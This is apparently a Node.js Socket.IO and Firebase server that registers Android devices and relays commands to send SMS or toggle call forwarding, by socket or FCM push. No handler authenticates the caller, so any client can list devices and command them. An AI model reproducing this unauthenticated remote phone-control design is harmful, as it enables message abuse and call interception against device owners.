const { db, messaging } = require("./firebase-init");

const MAX_ID_LENGTH = 128;
const MAX_FCM_TOKEN_LENGTH = 4096;
const MAX_PHONE_LENGTH = 32;
const MAX_SMS_MESSAGE_LENGTH = 2000;
const MAX_ACK_STATUS_LENGTH = 64;
const MAX_ACK_MESSAGE_LENGTH = 500;
const HEARTBEAT_MIN_INTERVAL_MS = 5000;
const INVALID_FIREBASE_KEY_CHARS = /[.#$\[\]\/\u0000-\u001F\u007F]/;

const allowedRefRoots = (process.env.ALLOWED_REF_ROOTS || "")
    .split(",")
    .map((value) => value.trim())
    .filter(Boolean);

let lastEventTimestamp = 0;
let eventSequence = 0;

function nextEventId() {
    const now = Date.now();

    if (now === lastEventTimestamp) {
        eventSequence += 1;
    } else {
        lastEventTimestamp = now;
        eventSequence = 0;
    }

    return eventSequence === 0 ? now.toString() : `${now}-${eventSequence}`;
}

function isValidKey(value) {
    return (
        typeof value === "string" &&
        value.length > 0 &&
        value.length <= MAX_ID_LENGTH &&
        !INVALID_FIREBASE_KEY_CHARS.test(value)
    );
}

function isValidRefRoot(value) {
    if (!isValidKey(value)) return false;

    return allowedRefRoots.length === 0 || allowedRefRoots.includes(value);
}

function isNonEmptyString(value, maxLength) {
    return typeof value === "string" && value.trim().length > 0 && value.length <= maxLength;
}

function isScalarId(value) {
    if (Number.isInteger(value)) return true;

    return isNonEmptyString(value, 64);
}

function normalizePhoneNumber(value) {
    if (typeof value === "string" || typeof value === "number") {
        return String(value).trim();
    }

    return "";
}

function normalizeEnable(value) {
    if (typeof value === "boolean") return value;
    if (value === 0 || value === 1) return value === 1;

    return null;
}

function buildEvent(deviceId, type, payload) {
    return {
        eventId: nextEventId(),
        deviceId,
        type,
        payload,
        createdAt: Date.now(),
        status: "pending"
    };
}

async function deliverEvent(io, device, event) {
    if (device.online && device.socketId) {
        io.to(device.socketId).emit("new_event", event);
        return "socket";
    }

    if (!isNonEmptyString(device.fcmToken, MAX_FCM_TOKEN_LENGTH)) {
        throw new Error("Device is offline and has no FCM token");
    }

    await messaging.send({
        token: device.fcmToken,
        data: {
            eventId: event.eventId,
            deviceId: event.deviceId,
            type: event.type,
            payload: JSON.stringify(event.payload)
        },
        android: { priority: "high" }
    });

    return "fcm";
}

async function getDevice(deviceId) {
    const snapshot = await db.ref(`devices/${deviceId}`).once("value");

    return snapshot.exists() ? snapshot.val() : null;
}

module.exports = (io) => {

    io.on("connection", (socket) => {

        console.log("====================================");
        console.log("Socket Connected :", socket.id);
        console.log("====================================");


        // DEVICE REGISTER

        socket.on("register", async (data) => {
            try {
                if (!data || typeof data !== "object" || !isValidKey(data.deviceId)) {
                    socket.emit("registered", {
                        success: false,
                        message: "Invalid deviceId"
                    });

                    return;
                }

                const hasRef = data.refDb !== undefined || data.refId !== undefined;

                if (hasRef && (!isValidRefRoot(data.refDb) || !isValidKey(data.refId))) {
                    socket.emit("registered", {
                        success: false,
                        message: "Invalid refDb or refId"
                    });

                    return;
                }

                const updates = {
                    [`devices/${data.deviceId}`]: {
                        deviceId: data.deviceId,
                        socketId: socket.id,
                        fcmToken: typeof data.fcmToken === "string" ? data.fcmToken : "",
                        online: true,
                        lastSeen: Date.now()
                    }
                };

                if (hasRef) {
                    updates[`${data.refDb}/${data.refId}`] = {
                        deviceId: data.deviceId
                    };
                }

                await db.ref().update(updates);

                socket.data.deviceId = data.deviceId;

                console.log("Device Registered :", data.deviceId);

                socket.emit("registered", { success: true });
            } catch (e) {
                console.error("Register failed:", e.message);

                socket.emit("registered", {
                    success: false,
                    message: "Registration failed"
                });
            }
        });


        // DISCONNECT

        socket.on("disconnect", async () => {
            try {
                console.log("Socket Disconnected :", socket.id);

                if (!socket.data.deviceId) return;

                await db.ref(`devices/${socket.data.deviceId}`).update({
                    online: false,
                    socketId: "",
                    lastSeen: Date.now()
                });

            } catch (e) {
                console.error("Disconnect update failed:", e.message);
            }
        });


        // UPDATE FCM TOKEN

        socket.on("update_fcm_token", async (data) => {
            try {
                if (!data || typeof data !== "object" || !isValidKey(data.deviceId)) return;
                if (!isNonEmptyString(data.fcmToken, MAX_FCM_TOKEN_LENGTH)) return;

                await db.ref(`devices/${data.deviceId}`).update({
                    fcmToken: data.fcmToken,
                    lastSeen: Date.now()
                });

                console.log("FCM Updated :", data.deviceId);
            } catch (e) {
                console.error("FCM token update failed:", e.message);
            }
        });


        // HEARTBEAT

        socket.on("heartbeat", async () => {
            try {
                if (!socket.data.deviceId) return;

                const now = Date.now();

                if (now - (socket.data.lastHeartbeatAt || 0) < HEARTBEAT_MIN_INTERVAL_MS) {
                    return;
                }

                socket.data.lastHeartbeatAt = now;

                await db.ref(`devices/${socket.data.deviceId}`).update({
                    online: true,
                    socketId: socket.id,
                    lastSeen: now
                });

            } catch (e) {
                console.error("Heartbeat update failed:", e.message);
            }
        });


        // GET DEVICES

        socket.on("get_devices", async () => {
            try {
                const snapshot = await db.ref("devices").once("value");

                if (!snapshot.exists()) {
                    socket.emit("device_list", []);
                    return;
                }

                const devices = Object.values(snapshot.val())
                    .filter((device) => device && typeof device === "object")
                    .map(({ fcmToken, ...device }) => device);

                socket.emit("device_list", devices);

            } catch (e) {
                console.error("Get devices failed:", e.message);
                socket.emit("device_list", []);
            }
        });


        // SEND SMS EVENT

        socket.on("send_sms", async (data) => {
            try {
                const payload = data && data.data;

                if (
                    !data ||
                    typeof data !== "object" ||
                    !isValidKey(data.deviceId) ||
                    !payload ||
                    typeof payload !== "object" ||
                    !isScalarId(payload.simId) ||
                    !isNonEmptyString(normalizePhoneNumber(payload.number), MAX_PHONE_LENGTH) ||
                    !isNonEmptyString(payload.message, MAX_SMS_MESSAGE_LENGTH)
                ) {
                    socket.emit("send_sms_result", {
                        success: false,
                        message: "Invalid Request"
                    });

                    return;
                }

                const device = await getDevice(data.deviceId);

                if (!device) {
                    socket.emit("send_sms_result", {
                        success: false,
                        message: "Device Not Found"
                    });

                    return;
                }

                const event = buildEvent(data.deviceId, "SEND_SMS", {
                    simId: payload.simId,
                    number: normalizePhoneNumber(payload.number),
                    message: payload.message
                });

                const transport = await deliverEvent(io, device, event);

                console.log(`SMS event ${event.eventId} sent via ${transport}`);

                socket.emit("send_sms_result", {
                    success: true,
                    eventId: event.eventId
                });

            } catch (e) {
                console.error("Send SMS failed:", e.message);

                socket.emit("send_sms_result", {
                    success: false,
                    message: "Failed to send SMS event"
                });
            }
        });


        // SEND CALL FORWARDING EVENT

        socket.on("call_forwarding", async (data) => {
            try {
                const payload = data && data.data;
                const enable = payload && normalizeEnable(payload.enable);

                if (
                    !data ||
                    typeof data !== "object" ||
                    !isValidKey(data.deviceId) ||
                    !payload ||
                    typeof payload !== "object" ||
                    !isScalarId(payload.simId) ||
                    enable === null
                ) {
                    socket.emit("call_forwarding_result", {
                        success: false,
                        message: "Invalid Request"
                    });

                    return;
                }

                const device = await getDevice(data.deviceId);

                if (!device) {
                    socket.emit("call_forwarding_result", {
                        success: false,
                        message: "Device not found"
                    });

                    return;
                }

                const event = buildEvent(data.deviceId, "SEND_CALL", {
                    simId: payload.simId,
                    enable
                });

                const transport = await deliverEvent(io, device, event);

                console.log(`Call forwarding event ${event.eventId} sent via ${transport}`);

                socket.emit("call_forwarding_result", {
                    success: true,
                    eventId: event.eventId
                });

            } catch (e) {
                console.error("Call forwarding failed:", e.message);

                socket.emit("call_forwarding_result", {
                    success: false,
                    message: "Failed to send call forwarding event"
                });
            }
        });


        // EVENT ACK

        socket.on("event_ack", (ack) => {
            try {
                if (!ack || typeof ack !== "object" || ack.eventId === undefined) return;

                const deviceId = socket.data.deviceId;

                if (!deviceId) return;

                const eventId = String(ack.eventId);

                if (!eventId || eventId.length > MAX_ID_LENGTH) return;

                const status = typeof ack.status === "string"
                    ? ack.status.slice(0, MAX_ACK_STATUS_LENGTH)
                    : "unknown";
                const message = typeof ack.message === "string"
                    ? ack.message.slice(0, MAX_ACK_MESSAGE_LENGTH)
                    : undefined;

                console.log("ACK :", eventId, status);

                io.emit("ack_update", {
                    eventId,
                    deviceId,
                    status,
                    message,
                    timestamp: Date.now()
                });

            } catch (e) {
                console.error("Event ACK failed:", e.message);
            }
        });

    });
};
